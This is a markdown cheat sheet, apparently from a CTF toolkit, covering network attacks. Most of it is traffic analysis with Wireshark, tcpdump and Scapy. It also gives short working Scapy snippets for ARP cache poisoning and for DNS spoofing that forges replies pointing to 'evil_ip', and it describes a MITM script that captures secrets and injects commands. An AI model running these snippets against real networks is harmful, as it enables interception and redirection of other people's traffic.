# Network

Network-level attack techniques and traffic manipulation for CTF challenges.

## Quick wins
- Start with passive sniffing to understand traffic patterns before active attacks
- For MITM challenges, verify ARP spoofing success before injecting packets
- Use Wireshark/tcpdump for debugging if Scapy scripts behave unexpectedly
- Check if IP forwarding is enabled: `cat /proc/sys/net/ipv4/ip_forward`

## ARP Spoofing / MITM

The included `mitm.py` script provides a template for:
1. ARP poisoning a client-server pair
2. Intercepting traffic on a specific port
3. Capturing secrets and injecting commands
4. Automatic ARP table restoration on exit

### Usage
```bash
# Edit IP/MAC addresses and interface in mitm.py
sudo python3 mitm.py
```

### Configuration variables
```python
client_ip = "1.1.1.2"
client_mac = "8a:54:54:b6:2b:41"
server_ip = "1.1.1.3"
server_mac = "e6:df:c0:23:e7:40"
target_port = 31337
interface = "eth0"
```

### Enable IP forwarding
```bash
# Temporary
echo 1 > /proc/sys/net/ipv4/ip_forward

# Permanent
sysctl -w net.ipv4.ip_forward=1
```

## Traffic Analysis

### Wireshark filters
```
# HTTP traffic
http

# DNS queries
dns.qry.name contains "flag"

# TCP to specific port
tcp.port == 31337

# Follow TCP stream
tcp.stream eq 0

# Filter by IP
ip.addr == 192.168.1.100

# HTTP POST requests
http.request.method == "POST"

# Find flags in data
frame contains "CTF{"
```

### tcpdump quick commands
```bash
# Capture all traffic on interface
tcpdump -i eth0 -w capture.pcap

# Filter by host
tcpdump -i eth0 host 192.168.1.100

# Filter by port
tcpdump -i eth0 port 80

# Filter by protocol
tcpdump -i eth0 tcp

# Read pcap file
tcpdump -r capture.pcap

# Show packet contents
tcpdump -i eth0 -X port 80
```

## Scapy Basics

### Sniffing
```python
from scapy.all import *

# Sniff packets with filter
sniff(filter="tcp port 80", prn=lambda x: x.summary(), count=10)

# Sniff and save to pcap
packets = sniff(filter="tcp", count=100)
wrpcap("capture.pcap", packets)
```

### Packet crafting
```python
# ARP request
arp = ARP(pdst="192.168.1.1")
send(arp)

# TCP SYN
ip = IP(dst="target.com")
tcp = TCP(dport=80, flags="S")
sr1(ip/tcp)

# ICMP ping
ping = IP(dst="target.com")/ICMP()
sr1(ping)
```

### ARP spoofing
```python
# Poison target's ARP cache
poison = ARP(op=2, psrc="gateway_ip", pdst="target_ip", hwdst="target_mac")
send(poison, loop=1, inter=0.5)
```

## DNS Attacks

### DNS spoofing with Scapy
```python
from scapy.all import *

def spoof_dns(pkt):
    if pkt.haslayer(DNSQR):
        spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                  UDP(dport=pkt[UDP].sport, sport=53) / \
                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                      an=DNSRR(rrname=pkt[DNSQR].qname, rdata="evil_ip"))
        send(spoofed)

sniff(filter="udp port 53", prn=spoof_dns)
```

## Common Tools

- [Wireshark](https://www.wireshark.org/): GUI packet analyzer
- [tcpdump](https://www.tcpdump.org/): CLI packet capture
- [Scapy](https://scapy.net/): Python packet manipulation
- [Ettercap](https://www.ettercap-project.org/): MITM framework
- [Bettercap](https://www.bettercap.org/): Modern MITM toolkit
- [mitmproxy](https://mitmproxy.org/): HTTP/HTTPS proxy
- [Responder](https://github.com/lgandx/Responder): LLMNR/NBT-NS/MDNS poisoner

## Useful One-Liners

```bash
# Get your MAC address
ip link show eth0 | grep ether

# Get target MAC from IP
arp -n 192.168.1.1

# Monitor ARP traffic
tcpdump -i eth0 arp

# Extract HTTP requests from pcap
tcpdump -r capture.pcap -A | grep -E "GET|POST|Host:"
```
